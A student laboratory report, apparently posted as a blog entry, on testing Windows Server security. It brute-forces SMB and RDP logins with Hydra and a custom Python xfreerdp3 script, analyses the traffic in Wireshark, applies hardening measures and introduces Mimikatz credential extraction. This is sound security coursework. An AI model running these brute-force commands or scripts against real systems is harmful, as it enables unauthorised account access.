&lt;li&gt;&lt;a href=&#34;#setting-up-the-exercise-environment&#34;&gt;Setting Up the Exercise Environment&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#brute-forcing-smb-with-hydra&#34;&gt;Brute-Forcing SMB with Hydra&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#analyzing-network-traffic-with-wireshark&#34;&gt;Analyzing Network Traffic with Wireshark&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#brute-forcing-rdp&#34;&gt;Brute-Forcing RDP&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#explaining-my-own-rdp-brute-forcing-script&#34;&gt;Explaining My Own RDP Brute-Forcing Script&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#analyzing-network-traffic-with-wireshark-rdp&#34;&gt;Analyzing Network Traffic with Wireshark (RDP)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#hardening-windows-against-brute-force-attacks&#34;&gt;Hardening Windows Against Brute-Force Attacks&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#using-evlwatcher-for-rate-limiting&#34;&gt;Using EvLWatcher for Rate Limiting&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#disabling-ntlm-authentication&#34;&gt;Disabling NTLM Authentication&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#configuring-login-timeout-settings&#34;&gt;Configuring Login Timeout Settings&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#mimikatz-an-introduction&#34;&gt;Mimikatz: An Introduction&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#what-can-mimikatz-do&#34;&gt;What Can Mimikatz Do?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#how-to-use-mimikatz&#34;&gt;How to Use Mimikatz&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#running-mimikatz&#34;&gt;Running Mimikatz&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#using-polyglot-files-to-conceal-mimikatz&#34;&gt;Using Polyglot Files to Conceal Mimikatz&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#dll-side-loading-to-attempt-to-bypass-windows-defender&#34;&gt;DLL Side-Loading to Attempt to Bypass Windows Defender&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#how-to-detect-and-block-mimikatz&#34;&gt;How to Detect and Block Mimikatz&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#references&#34;&gt;References&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;task-definition&#34;&gt;Task definition&lt;/h2&gt;
&lt;p&gt;This task was conducted using a combination of manual configuration and automated attack tools to evaluate the security posture of a Windows Server environment. The environment setup involved preparing both the target system and an attacker system running Kali Linux, which was equipped with tools such as Hydra for brute-force attacks and Wireshark for network traffic analysis.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<blockquote>
<p>Note: this was converted using from LaTeX to Markdown using Chat GPT 4.1 the original pdf can be found <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex9/Sicherheitstests%20von%20Windows%20Server.pdf">here</a> along with the <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex9/zotero.bib">bibliography</a></p></blockquote>
<hr>
<h1 id="testing-windows-server-security">Testing Windows server security</h1>
<hr>
<p><strong>Laboratory protocol</strong><br>
Exercise 9: Testing Windows server security<br>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/menthing.png"/> <figcaption>
            Figure: Grouplogo
        </figcaption>
</figure>

<strong>Subject:</strong> ITSI<br>
<strong>Class:</strong> 3AHITN<br>
<strong>Name:</strong> Stefan Fürst, Justin Tremurici<br>
<strong>Group Name/Number:</strong> Name here/12<br>
<strong>Supervisor:</strong> SPAC, ZIVK<br>
<strong>Exercise dates:</strong> 14.03.2025 | 21.03.2025 | 28.03.2025 | 04.04.2025<br>
<strong>Submission date:</strong> 11.04.2025</p>
<hr>
<h2 id="table-of-contents">Table of Contents</h2>
<ul>
<li><a href="#task-definition">Task definition</a></li>
<li><a href="#summary">Summary</a></li>
<li><a href="#complete-network-topology-of-the-exercise">Complete network topology of the exercise</a></li>
<li><a href="#exercise-execution">Exercise Execution</a>
<ul>
<li><a href="#setting-up-the-exercise-environment">Setting Up the Exercise Environment</a></li>
<li><a href="#brute-forcing-smb-with-hydra">Brute-Forcing SMB with Hydra</a>
<ul>
<li><a href="#analyzing-network-traffic-with-wireshark">Analyzing Network Traffic with Wireshark</a></li>
</ul>
</li>
<li><a href="#brute-forcing-rdp">Brute-Forcing RDP</a>
<ul>
<li><a href="#explaining-my-own-rdp-brute-forcing-script">Explaining My Own RDP Brute-Forcing Script</a></li>
<li><a href="#analyzing-network-traffic-with-wireshark-rdp">Analyzing Network Traffic with Wireshark (RDP)</a></li>
</ul>
</li>
<li><a href="#hardening-windows-against-brute-force-attacks">Hardening Windows Against Brute-Force Attacks</a>
<ul>
<li><a href="#using-evlwatcher-for-rate-limiting">Using EvLWatcher for Rate Limiting</a></li>
<li><a href="#disabling-ntlm-authentication">Disabling NTLM Authentication</a></li>
<li><a href="#configuring-login-timeout-settings">Configuring Login Timeout Settings</a></li>
</ul>
</li>
<li><a href="#mimikatz-an-introduction">Mimikatz: An Introduction</a>
<ul>
<li><a href="#what-can-mimikatz-do">What Can Mimikatz Do?</a></li>
<li><a href="#how-to-use-mimikatz">How to Use Mimikatz</a></li>
</ul>
</li>
<li><a href="#running-mimikatz">Running Mimikatz</a>
<ul>
<li><a href="#using-polyglot-files-to-conceal-mimikatz">Using Polyglot Files to Conceal Mimikatz</a></li>
<li><a href="#dll-side-loading-to-attempt-to-bypass-windows-defender">DLL Side-Loading to Attempt to Bypass Windows Defender</a></li>
<li><a href="#how-to-detect-and-block-mimikatz">How to Detect and Block Mimikatz</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
<hr>
<h2 id="task-definition">Task definition</h2>
<p>This task was conducted using a combination of manual configuration and automated attack tools to evaluate the security posture of a Windows Server environment. The environment setup involved preparing both the target system and an attacker system running Kali Linux, which was equipped with tools such as Hydra for brute-force attacks and Wireshark for network traffic analysis.</p>
<p>Initially, the target Windows Server was configured by creating a new local user account named <code>testuser</code> with the password <code>passwort</code>. A network share was created using <code>New-SmbShare</code>, and permissions were assigned to <code>testuser</code> to grant access. Concurrently, Wireshark was deployed on either the server or an intermediary device to capture and analyze traffic related to the attacks.</p>
<p>To simulate credential-based attacks, Hydra was used to conduct brute-force attempts on the SMB protocol:</p>
<pre tabindex="0"><code>hydra -l testuser -P /path/to/passwordlist.txt smb://&lt;IP-ADDRESS&gt;
</code></pre><p>The time to successful login was measured and compared between weak (e.g., <code>passwort</code>) and strong (e.g., <code>P@ssw0rd123!</code>) password configurations. Network traffic was captured and filtered using the expression <code>tcp.port == 445</code>, enabling detailed inspection of failed and successful authentication attempts.</p>
<p>A second brute-force attack was executed against the Remote Desktop Protocol (RDP). RDP was enabled through system settings, and <code>testuser</code> was added to the <code>Remote Desktop Users</code> group. Hydra was again utilized for this. Wireshark was used to capture the RDP traffic (<code>tcp.port == 3389</code>) for comparison against the SMB-based attack. Observations highlighted protocol-level differences in how failed and successful login attempts were processed and exposed.</p>
<p>Following the attacks, two mitigation techniques were researched and implemented to harden the system. Group Policy Objects (GPOs) were configured to enforce account lockout policies and limit RDP access. These changes were validated by re-running attacks and observing reduced effectiveness due to increased security controls.</p>
<p>Additionally, privilege escalation techniques were examined using Mimikatz. Requirements for successful execution were researched, including necessary privileges and system policies. As a bonus, Mimikatz was tested on the server to extract credentials and security tokens. The analysis revealed sensitive credential information, underscoring the importance of disabling credential caching and applying strict administrative controls.</p>
<hr>
<h2 id="summary">Summary</h2>
<p>In this exercise, we used <code>Hydra</code> for brute-force attacks on various services. However, due to issues with Hydra&rsquo;s support for RDP brute-forcing, we created a custom Python script that utilized the <code>FreeRDP</code> command to perform the RDP brute-force attacks. This solution allowed us to bypass the limitations of Hydra and simulate RDP credential stuffing attacks effectively.</p>
<p>To enhance the security of the target system, we adjusted Group Policy settings, specifically disabling <code>NTLM</code> authentication and modifying account lockout policies. These changes were intended to limit the success of brute-force attacks by reducing the number of login attempts allowed.</p>
<p>We also deployed <code>EvWatcher</code> to monitor and limit attack attempts, ensuring that further malicious actions would be detected and blocked. For privilege escalation, we used <code>MSHTA</code> in combination with an MP3 file to bypass security and deploy <code>Mimikatz</code> onto the target system. To ensure <code>Mimikatz</code> could function, we disabled Windows Defender.</p>
<p><code>Mimikatz</code> is a powerful tool used to extract credentials, manipulate security tokens, and perform privilege escalation on Windows systems. It can dump plaintext passwords, password hashes, and Kerberos tickets from memory, providing an attacker with sensitive information. This exercise highlighted the importance of securing systems against such attacks by using strong policies, disabling insecure protocols like <code>NTLM</code>, and employing endpoint protection to prevent tools like <code>Mimikatz</code> from successfully exploiting the system.</p>
<hr>
<h2 id="complete-network-topology-of-the-exercise">Complete network topology of the exercise</h2>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/topo.png"/> <figcaption>
            Figure 1: Complete network topology of the exercise
        </figcaption>
</figure>

<hr>
<h2 id="exercise-execution">Exercise Execution</h2>
<h3 id="setting-up-the-exercise-environment">Setting Up the Exercise Environment</h3>
<p>To meet the initial requirements of this exercise, the script from last time was simplified to create only five test users, along with corresponding security groups. Most randomly generated elements were removed, leaving only three shares on the <code>C:</code> drive. This can be verified in the Computer Management utility under the Users, Shares, and Groups categories, as shown in the figures below.</p>
<p><figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/user.png"/> <figcaption>
            Figure 2: Verifying the creation of the users
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/groups.png"/> <figcaption>
            Figure 3: Verifying the creation of the groups
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/shares.png"/> <figcaption>
            Figure 4: Verifying the creation of the shares
        </figcaption>
</figure>
</p>
<hr>
<h3 id="brute-forcing-smb-with-hydra">Brute-Forcing SMB with Hydra</h3>
<p>Since part of the setup involved assigning weak passwords to the users, they can be easily brute-forced with Hydra using the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>hydra -l user1 -P /usr/share/wordlists/rockyou.txt -t <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">192.168</span>.56.102 smb2 -I
</span></span></code></pre></div><p>This command consists of the <code>-l</code> flag to specify the user to target, and the <code>-P</code> flag to specify the list of passwords to use—in this case, the RockYou wordlist. Note that <code>-P</code> (uppercase) indicates a list of passwords, whereas <code>-p</code> (lowercase) is used for a single password. The <code>-t</code> flag sets the number of threads to use for the attack. <code>192.168.56.102</code> sets the target IP address, and <code>smb2</code> specifies the protocol to use. The <code>-I</code> flag tells Hydra to ignore restoring progress from an earlier session.</p>
<p>After running the command, we can see that <code>password123_</code> is not a secure password, as it gets cracked in just one second.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/hydrasmb.png"/> <figcaption>
            Figure 5: Obtaining the password for the smb share
        </figcaption>
</figure>

<hr>
<h4 id="analyzing-network-traffic-with-wireshark">Analyzing Network Traffic with Wireshark</h4>
<p>By filtering for <code>tcp.port == 445</code>, we can examine the SMB-related network traffic being sent and received, and analyze the authentication process taking place alongside it.</p>
<ul>
<li>The first SMB packet is sent using version 1 instead of version 2, despite version 2 being specified in the command. This is explained in the SMB specification <!-- raw HTML omitted -->Microsoft Corporation<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup><!-- raw HTML omitted -->.</li>
</ul>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/smb1.png"/> <figcaption>
            Figure 6: Inspecting the first Negotiate Protocol Request
        </figcaption>
</figure>

<ul>
<li>The <code>Negotiate Protocol Request</code> informs the server of the SMB dialects (i.e., versions) the client supports, which is essentially an array of supported versions. <!-- raw HTML omitted -->Microsoft Community Hub<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup><!-- raw HTML omitted --></li>
</ul>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/smb2.png"/> <figcaption>
            Figure 7: Viewing the Negotiate Protocol Response
        </figcaption>
</figure>

<ul>
<li>The server responds with a <code>Negotiate Protocol Response</code>, replying with the preferred SMB dialect and an array of capabilities. In this case, the server responds with the <code>SMB2 Wildcard</code>, indicating that it supports at least <code>SMB 2.1</code> or a newer version. This prompts the client to send another <code>SMB2 Negotiate Request</code> specifying the exact revision of the SMB 2 protocol to be used.</li>
</ul>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/smb3.png"/> <figcaption>
            Figure 8: Viewing the second Negotiate Protocol Request
        </figcaption>
</figure>

<ul>
<li>Now the client responds with its own list of supported capabilities.</li>
</ul>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/smb4.png"/> <figcaption>
            Figure 9: Viewing the second Negotiate Protocol Response
        </figcaption>
</figure>

<ul>
<li>
<p>The server follows up by specifying the preferred dialect from the client’s dialect array—which in this case is <code>SMB 3.1.1</code>—and additionally updates the listed capabilities based on the selected version. This version will now be used for the connection.</p>
</li>
<li>
<p>After a dialect and capabilities have been selected, a <code>Session Setup Request</code> is sent, initiating the authentication process using the GSS-API (Generic Security Service Application Program Interface). This is used alongside NTLMSSP, which stands for NT LAN Manager Security Support Provider—a binary messaging protocol developed by Microsoft to facilitate NTLM challenge-response authentication and to negotiate integrity and confidentiality options. <!-- raw HTML omitted -->Wikipedia<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup><!-- raw HTML omitted --></p>
</li>
</ul>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/smb5.png"/> <figcaption>
            Figure 10: Viewing the Session Setup Request
        </figcaption>
</figure>

<ul>
<li>The server responds with <code>STATUS_MORE_PROCESSING_REQUIRED</code>, indicating that guest access is disabled and authentication is required to connect to this SMB share. <!-- raw HTML omitted -->Microsoft Docs<sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup><!-- raw HTML omitted --></li>
</ul>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/smb6.png"/> <figcaption>
            Figure 11: Viewing the Session Setup Response
        </figcaption>
</figure>

<ul>
<li>The client sends another <code>Session Setup Request</code> with <code>NTLMSSP_AUTH</code>, including the domain name, user name, and session key.</li>
</ul>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/smb7.png"/> <figcaption>
            Figure 12: Viewing the second Session Setup Request
        </figcaption>
</figure>

<ul>
<li>If the authentication fails, the server responds with <code>STATUS_LOGON_FAILURE</code>.</li>
</ul>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/smb8.png"/> <figcaption>
            Figure 13: Viewing the second Session Setup Response
        </figcaption>
</figure>

<ul>
<li>If the authentication succeeds, the NT Status field in the header of the <code>Session Setup Response</code> is set to <code>STATUS_SUCCESS</code>. This is followed by a <code>Tree Connect Request</code> to access a share on the server. Since I did not specify a share, Hydra defaults to the administrative share <code>$IPC</code>, which is used to communicate with programs via named pipes over the network. <!-- raw HTML omitted -->Windows OS Hub<sup id="fnref:5"><a href="#fn:5" class="footnote-ref" role="doc-noteref">5</a></sup><!-- raw HTML omitted --></li>
</ul>
<p><figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/smb9.png"/> <figcaption>
            Figure 14: Viewing the successful Session Setup Response
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/smb10.png"/> <figcaption>
            Figure 15: Viewing the Tree Connect Request
        </figcaption>
</figure>
</p>
<ul>
<li>The <code>Tree Connect Request</code> is followed by a <code>Tree Connect Response</code>, which includes an Access Mask field for the requested share, showing the permissions our user has on this share.</li>
</ul>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/smb11.png"/> <figcaption>
            Figure 16: Viewing the Tree Connect Response
        </figcaption>
</figure>

<hr>
<h3 id="brute-forcing-rdp">Brute-Forcing RDP</h3>
<p><code>RDP</code> is a proprietary protocol developed by Microsoft that allows a user to connect to another computer with a graphical interface. <!-- raw HTML omitted -->Wikipedia<sup id="fnref:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup><!-- raw HTML omitted --> <!-- raw HTML omitted -->Microsoft Docs<sup id="fnref:7"><a href="#fn:7" class="footnote-ref" role="doc-noteref">7</a></sup><!-- raw HTML omitted --></p>
<p>However, Hydra did not detect my installation of <code>libfreerdp3</code>, so I created a custom Python RDP brute-forcing script based on the <code>xfreerdp3</code> command.</p>
<p><figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/hydranordp.png"/> <figcaption>
            Figure 17: Hydra showing that it&#39;s not compiled with freerdp support
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/freerdpnonono.png"/> <figcaption>
            Figure 18: Showing that the libfreerdp3 package is installed but not found
        </figcaption>
</figure>
</p>
<p>Using my script, I can now obtain the credentials and generate a command to connect to the server.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/rdpburteforce.png"/> <figcaption>
            Figure 19: Obtaining the credentials of the user
        </figcaption>
</figure>

<h4 id="explaining-my-own-rdp-brute-forcing-script">Explaining My Own RDP Brute-Forcing Script</h4>
<p>The script uses threading and the <code>xfreerdp3</code> command with <code>+auth-only</code> to check credentials. Here is an abstracted version:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess<span style="color:#f92672">,</span> threading<span style="color:#f92672">,</span> argparse<span style="color:#f92672">,</span> concurrent.futures
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>password_found <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Event()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run_command</span>(host, user, port, password):
</span></span><span style="display:flex;"><span>    cmd <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;xfreerdp3&#34;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;/v:</span><span style="color:#e6db74">{</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;/u:</span><span style="color:#e6db74">{</span>user<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;/p:</span><span style="color:#e6db74">{</span>password<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;+auth-only&#34;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>run(cmd, capture_output<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, text<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> result<span style="color:#f92672">.</span>returncode, result<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>strip(), result<span style="color:#f92672">.</span>stderr<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;Error&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">worker</span>(args, passwords):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> pw <span style="color:#f92672">in</span> passwords:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> password_found<span style="color:#f92672">.</span>is_set(): <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>        code, _, _ <span style="color:#f92672">=</span> run_command(args<span style="color:#f92672">.</span>host, args<span style="color:#f92672">.</span>user, args<span style="color:#f92672">.</span>port, pw)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> code <span style="color:#f92672">==</span> <span style="color:#ae81ff">131</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;SUCCESS: </span><span style="color:#e6db74">{</span>pw<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>            password_found<span style="color:#f92672">.</span>set()
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-u&#34;</span>, <span style="color:#e6db74">&#34;--user&#34;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ... other arguments ...</span>
</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pwlist <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>Password_list) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> f:
</span></span><span style="display:flex;"><span>            pwlist<span style="color:#f92672">.</span>append(line<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>threads <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>        worker(args, pwlist)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># ...split pwlist and run with ThreadPoolExecutor...</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> password_found<span style="color:#f92672">.</span>is_set():
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Password not found&#34;</span>)
</span></span></code></pre></div><hr>
<h4 id="analyzing-network-traffic-with-wireshark-rdp">Analyzing Network Traffic with Wireshark (RDP)</h4>
<p>When inspecting the traffic of an <code>RDP</code> connection, only two RDP requests are sent: a <code>Negotiate Request</code> and a <code>Negotiate Response</code>. The <code>Negotiate Request</code> is used by the client to advertise the supported security protocols.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/rdpneg%20req.png"/> <figcaption>
            Figure 20: Viewing the RDP Negotiate Request
        </figcaption>
</figure>

<p>The server replies with the protocol to use based on the client’s advertisement, which in this case is <code>CredSSP</code> (Credential Security Support Provider). <code>CredSSP</code> provides an encrypted TLS channel, over which the client authenticates using the Simple and Protected Negotiate (SPNEGO) protocol with either Microsoft Kerberos or Microsoft NTLM.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/rdp%20neg%20res.png"/> <figcaption>
            Figure 21: Viewing the RDP Negotiate Response
        </figcaption>
</figure>

<p>After selecting the protocol, a TLS handshake occurs between the client and the server. During this handshake, both parties agree on the TLS version, choose a cipher suite, authenticate the server’s identity via its public key and the digital signature of an SSL certificate authority, and generate session keys in order to use symmetric encryption after the handshake is complete.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/tlshandshake.png"/> <figcaption>
            Figure 22: Viewing the Handshake and Termination of the Connection
        </figcaption>
</figure>

<p>Whether or not the RDP authentication was successful cannot be directly observed, as all communication is wrapped inside encrypted TLS packets, making it appear identical in Wireshark. The only indicator is the amount of application data transmitted, from which it can be inferred whether the client briefly connected for authentication only or simply transmitted credentials over the TLS connection before the authentication failed.</p>
<p>The main difference isn&rsquo;t just the authentication mechanisms (CSPP/TLS vs. GSS-API/NTLMSSP). A crucial distinction is how encryption is handled. RDP can use TLS to encrypt all traffic, including application data, whereas SMB uses GSS-API to negotiate authentication (often using Kerberos or NTLM) and can encrypt SMB packets directly, especially in newer versions (SMB 3.0+). When RDP uses TLS, it creates a TLS tunnel. SMB encryption is integrated within the SMB protocol itself. <!-- raw HTML omitted -->Microsoft Corporation<sup id="fnref1:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup><!-- raw HTML omitted --> <!-- raw HTML omitted -->Wikipedia<sup id="fnref1:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup><!-- raw HTML omitted --></p>
<hr>
<h3 id="hardening-windows-against-brute-force-attacks">Hardening Windows Against Brute-Force Attacks</h3>
<h4 id="using-evlwatcher-for-rate-limiting">Using EvLWatcher for Rate Limiting</h4>
<p>To set up rate limiting, I used a <code>fail2ban</code>-style tool for Windows called EvLWatcher. After running the setup executable, no additional configuration is necessary, and it can essentially be left to run in the background. <!-- raw HTML omitted -->GitHub<sup id="fnref:8"><a href="#fn:8" class="footnote-ref" role="doc-noteref">8</a></sup><!-- raw HTML omitted --></p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/evlwatcherf.png"/> <figcaption>
            Figure 23: Observing The Attackers IP-Address getting temporarily banned
        </figcaption>
</figure>

<h4 id="disabling-ntlm-authentication">Disabling NTLM Authentication</h4>
<p>NTLM is a legacy authentication protocol that dates back to Windows NT. Although Microsoft introduced a more secure alternative called Kerberos in 1989, NTLM is still used in some domain networks and remains enabled for backward compatibility. One of NTLM&rsquo;s major flaws is that it stores password hashes in plaintext in the memory of its servers, which can be extracted using pass-the-hash tools such as Mimikatz. <!-- raw HTML omitted -->Windows OS Hub<sup id="fnref:9"><a href="#fn:9" class="footnote-ref" role="doc-noteref">9</a></sup><!-- raw HTML omitted --> <!-- raw HTML omitted -->Wikipedia<sup id="fnref1:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup><!-- raw HTML omitted --></p>
<p><figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/disablentlm.png"/> <figcaption>
            Figure 24: Disabling NTLM authentication for all accounts
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/nontlm.png"/> <figcaption>
            Figure 25: Hydra failing without being able to use NTLM
        </figcaption>
</figure>
</p>
<h4 id="configuring-login-timeout-settings">Configuring Login Timeout Settings</h4>
<p>To slow down RDP brute-forcing, account lockout can be configured in the Local Security Policy editor under Account Lockout Policy. <!-- raw HTML omitted -->The Windows Club<sup id="fnref:10"><a href="#fn:10" class="footnote-ref" role="doc-noteref">10</a></sup><!-- raw HTML omitted --></p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/lockout.png"/> <figcaption>
            Figure 26: Showing the lockout policy
        </figcaption>
</figure>

<hr>
<h3 id="mimikatz-an-introduction">Mimikatz: An Introduction</h3>
<p>Mimikatz is a post-exploitation tool designed to extract credential information. <!-- raw HTML omitted -->Medium<sup id="fnref:11"><a href="#fn:11" class="footnote-ref" role="doc-noteref">11</a></sup><!-- raw HTML omitted --></p>
<h4 id="what-can-mimikatz-do">What Can Mimikatz Do?</h4>
<p>The main features of Mimikatz include extracting credentials from memory or disk-based password stores. This includes plaintext passwords, PINs, Kerberos tickets, and NTLM password hashes. Mimikatz achieves this through a variety of techniques, such as Pass-the-Hash, which allows attackers to use captured NTLM hashes to create new authenticated sessions on the network—without needing to know the user’s actual password. <!-- raw HTML omitted -->CrowdStrike<sup id="fnref:12"><a href="#fn:12" class="footnote-ref" role="doc-noteref">12</a></sup><!-- raw HTML omitted --> <!-- raw HTML omitted -->MITRE ATT&amp;CK<sup id="fnref:13"><a href="#fn:13" class="footnote-ref" role="doc-noteref">13</a></sup><!-- raw HTML omitted --></p>
<ul>
<li><strong>Pass-the-Hash:</strong> Allows attackers to use captured NTLM hashes to create new authenticated sessions.</li>
<li><strong>Pass-the-ticket:</strong> Bypasses normal system access controls by stealing a valid Kerberos ticket.</li>
</ul>
